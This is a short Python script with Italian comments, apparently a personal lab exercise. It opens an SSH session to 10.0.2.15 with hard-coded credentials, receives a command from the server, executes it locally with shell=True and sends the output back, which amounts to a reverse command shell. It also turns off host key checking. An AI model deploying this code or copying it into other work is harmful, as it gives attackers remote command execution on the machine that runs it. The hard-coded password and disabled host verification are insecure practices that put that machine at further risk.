#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu Sep 16 11:15:20 2021

@author: kali
"""

#protocollo SSH che permette di fare comunicare due sistemi tipo client-server
#e una conessione cifrata xo

#SSH e un protocollo sicuro e cifrato
#clinet SSH

import paramiko
import warnings
import subprocess

warnings.filterwarnings(action="ignore",module=".*paramiko.*")  #per evitare i worning rilasciati da paramiko

client=paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

client.connect("10.0.2.15", username="pippo",password="pippo123456")

chan=client.get_transport().open_session()

comando="pwd"  #comandi terminale linux qualsiasi, possiamo inviare qualsiasi cosa

chan.send(comando) #abbiamo inviato il comando

#ricevo comando
command=chan.recv(1024)
command=str(command,"utf-8")

CMD=subprocess.check_output([command],shell=True)

CMD=str(CMD)

#ora invio il risultato al Server
chan.send(CMD)



client.close()




